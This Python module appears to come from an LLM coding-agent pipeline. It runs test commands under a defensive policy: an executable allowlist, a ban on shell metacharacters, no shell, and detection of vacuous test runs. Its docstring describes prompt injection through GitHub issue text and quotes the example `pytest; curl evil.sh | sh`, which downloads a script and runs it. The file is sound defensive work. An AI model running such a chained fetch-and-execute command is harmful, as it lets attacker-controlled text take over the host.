"""Shell adapter — run test commands safely inside the project directory.

Security model: the test command originates from an LLM whose context can include
attacker-controlled text (e.g. a GitHub issue body via the webhook). It is treated
as untrusted. Commands are tokenised with shlex, executed with shell=False (no shell
interpretation), the executable must be in an allowlist, and shell metacharacters are
rejected outright. This prevents command chaining / injection such as
`pytest; curl evil.sh | sh`.
"""
from __future__ import annotations

import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path

# Only these executables are permitted.
_ALLOWED = frozenset({
    "pytest", "python", "python3",
    "npm", "npx", "yarn", "pnpm",
    "go", "cargo",
    "make",
    "jest", "vitest", "mocha",
})

# Characters that enable command chaining, redirection, substitution, or globtrick.
# Their presence anywhere in the raw command string is a hard reject — we never want
# the test command to do anything but run a single test process.
_FORBIDDEN_CHARS = frozenset(";&|`$><\n\r\\")

_DEFAULT_TIMEOUT = 300  # 5 minutes

# Markers indicating a 'green' run that collected no tests — a pass here proves
# nothing about the change.
_VACUOUS_MARKERS = (
    "no tests ran",
    "no tests collected",
    "collected 0 items",
    "0 passed",
    "ran 0 tests",
    "no test files found",
    "found 0 tests",
    "0 total",
)


def output_looks_vacuous(text: str) -> bool:
    """True if test output indicates zero tests were actually collected/run."""
    low = (text or "").lower()
    return any(m in low for m in _VACUOUS_MARKERS)


class UnsafeCommandError(ValueError):
    """Raised when a test command is rejected by the safety policy."""


@dataclass
class TestResult:
    passed: bool
    command: str
    return_code: int
    stdout: str
    stderr: str

    def summary(self) -> str:
        status = "PASSED" if self.passed else "FAILED"
        lines = [f"Command: {self.command}", f"Status:  {status}"]
        if self.stdout.strip():
            lines += ["", "stdout:", self.stdout.strip()[-2000:]]
        if self.stderr.strip():
            lines += ["", "stderr:", self.stderr.strip()[-500:]]
        return "\n".join(lines)


def _validate_and_tokenize(command: str) -> list[str]:
    """
    Validate a command against the safety policy and return its argv tokens.

    Raises UnsafeCommandError if the command contains shell metacharacters or the
    executable is not in the allowlist.
    """
    if not command or not command.strip():
        raise UnsafeCommandError("Empty test command")

    bad = sorted(set(command) & _FORBIDDEN_CHARS)
    if bad:
        raise UnsafeCommandError(
            f"Test command contains forbidden shell metacharacter(s) {bad!r}. "
            "Command chaining, redirection, and substitution are not allowed."
        )

    try:
        tokens = shlex.split(command)
    except ValueError as e:
        raise UnsafeCommandError(f"Could not parse test command: {e}") from None

    if not tokens:
        raise UnsafeCommandError("Empty test command after parsing")

    executable = tokens[0]
    if executable not in _ALLOWED:
        raise UnsafeCommandError(
            f"'{executable}' is not in the allowed command list. "
            f"Allowed: {sorted(_ALLOWED)}"
        )

    return tokens


class ShellAdapter:
    """Run test commands in a controlled subprocess (no shell, allowlisted)."""

    def __init__(self, cwd: Path, timeout: int = _DEFAULT_TIMEOUT):
        self.cwd = cwd
        self.timeout = timeout

    def run_tests(self, command: str) -> TestResult:
        """
        Execute a test command safely.

        Raises UnsafeCommandError (a ValueError subclass) if the command violates
        the safety policy — preventing arbitrary command execution.
        """
        tokens = _validate_and_tokenize(command)

        try:
            proc = subprocess.run(
                tokens,
                shell=False,
                cwd=self.cwd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
            )
        except subprocess.TimeoutExpired:
            return TestResult(
                passed=False,
                command=command,
                return_code=-1,
                stdout="",
                stderr=f"Command timed out after {self.timeout}s",
            )
        except FileNotFoundError:
            return TestResult(
                passed=False,
                command=command,
                return_code=-1,
                stdout="",
                stderr=f"Executable not found: {tokens[0]}",
            )

        return TestResult(
            passed=proc.returncode == 0,
            command=command,
            return_code=proc.returncode,
            stdout=proc.stdout,
            stderr=proc.stderr,
        )

    def run(self, command: str) -> tuple[bool, str]:
        """Convenience wrapper returning (passed, combined_output)."""
        result = self.run_tests(command)
        return result.passed, result.summary()


# Backwards-compatible alias used by the orchestrator pipeline.
ShellRunner = ShellAdapter
